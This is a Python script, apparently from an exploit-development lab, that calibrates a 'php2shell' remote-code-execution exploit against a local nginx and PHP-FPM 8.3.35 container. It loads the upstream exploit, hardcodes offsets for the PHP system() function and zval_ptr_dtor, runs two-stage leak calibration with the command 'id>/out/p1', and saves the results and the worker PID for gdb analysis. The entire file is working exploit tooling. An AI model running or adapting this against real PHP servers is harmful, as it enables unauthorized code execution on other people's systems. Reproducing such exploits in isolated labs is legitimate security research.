#!/usr/bin/env python3
"""FPM calibration: generic stage-1/stage-2 calibration on nginx+fpm 8.3.35.

No mod_php hints — FPM's SAPI startup allocations differ, so the leak shapes
are re-derived with the generic probe/sweep. Writes state for the gdb
forensics step. Container stays up.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
import time

LAB = os.path.dirname(os.path.abspath(__file__))
DEV = os.path.join(LAB, "devploit-php2shell")
VENDOR = os.path.join(DEV, "vendor", "php2shell-upstream")
sys.path.insert(0, os.path.join(DEV, "tools"))
sys.path.insert(0, LAB)

import php2shell_calibrate as C  # noqa: E402
from ka_target import KATarget  # noqa: E402

URL = "http://127.0.0.1:8304/index.php"
STATE = "/tmp/p2s-fpm-8335.json"
ZIF = 0x489540     # zif_system, php-fpm binary (function-table reloc)
DTOR = 0x57C110    # zval_ptr_dtor, dynamic export


def main() -> int:
    mod = C.load_upstream(VENDOR)
    ka = KATarget(mod.Target(URL, verbose=False))
    ex = mod.Exploit(ka, "id>/out/p1", zif_offset=ZIF, dtor_offset=DTOR,
                     profile="bookworm", verbose=True)

    ex.rotate()
    chunk, n, flen = C.calibrate_stage1(mod, ex, {})
    if not chunk:
        print("[!] stage-1 failed on FPM")
        return 2
    lib, tidx = C.calibrate_stage2(mod, ex, DTOR, {})
    if not lib:
        print("[!] stage-2 failed on FPM")
        return 2
    print(f"[*] FPM calibrated: chunk={hex(chunk)} libphp={hex(lib)} "
          f"n={n} forge={flen} T={tidx}")

    # the single fpm child's host pid
    init_pid = int(subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Pid}}", "p2s-fpm83"],
        capture_output=True, text=True, check=True).stdout.strip())
    kids = subprocess.run(["pgrep", "-P", str(init_pid)],
                          capture_output=True, text=True).stdout.split()
    worker = int(kids[0]) if kids else init_pid

    with open(STATE, "w", encoding="utf-8") as fh:
        json.dump({"chunk": chunk, "lib": lib, "zif": ZIF, "dtor": DTOR,
                   "worker": worker, "stage1_n": n, "forge": flen,
                   "stage2_t": tidx}, fh)
    print(f"[*] state -> {STATE}; fpm worker pid={worker}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
